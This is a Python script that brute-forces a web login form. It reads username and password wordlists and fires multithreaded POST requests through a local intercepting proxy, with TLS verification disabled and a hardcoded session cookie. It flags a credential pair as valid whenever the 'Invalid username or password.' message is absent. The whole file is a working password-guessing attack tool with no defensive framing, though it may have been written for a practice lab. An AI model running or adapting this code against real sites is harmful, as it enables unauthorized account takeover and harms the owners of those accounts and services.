import requests 
import urllib3 
from concurrent.futures import ThreadPoolExecutor 
import sys 

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def auth(url):
    proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'} 
    # Read usernames.txt file  
    with open('usernames.txt', 'r') as usernames:
        users = set(username.strip() for username in usernames)

    # Read passwords.txt file 
    with open('passwords.txt', 'r') as passwords:        
        passkeys = set(password.strip() for password in passwords)

    with ThreadPoolExecutor(max_workers=60) as executor:
        for username in users:
            futures = []
            for password in passkeys:
                params = {
                    "username": username,
                    "password": password
                }
                cookies = {'sesions':'VikZiArLVbFGAK68nnEr1cK51iJJo8Mj'}
                future = executor.submit(requests.post,url, data=params, cookies=cookies, proxies=proxies, verify=False)
                futures.append((future, username, password))

            for future, username, password in futures:
                result = future.result().text    

                http_resp = ['Invalid username or password.'] 

                if http_resp[0] not in result:
                    sys.stdout.write('\r\033[K')
                    sys.stdout.write(f'\r[+] Username: {username}, Password: {password}')
                    sys.stdout.flush()
                    sys.exit(1)
                else:
                    # ANSI esacpe code to clear the entire line before cursor 
                    # this prevents the extra charcters from getting visible if nextpassword is shorter than the previous one
                    sys.stdout.write('\r\033[K')
                    sys.stdout.write(f'\rUsername: {username}, Password: {password}')    
                    sys.stdout.flush()
                

def main():
    if len(sys.argv) != 2:
        print(f'[+] Usage: {sys.argv[0]} <url>')
        print(f'[+] Example: {sys.argv[0]} example.com')
        sys.exit(-1)

    url = sys.argv[1]
    print('[+] Breaking athentication..')
    auth(url)

if __name__ == '__main__':
    main()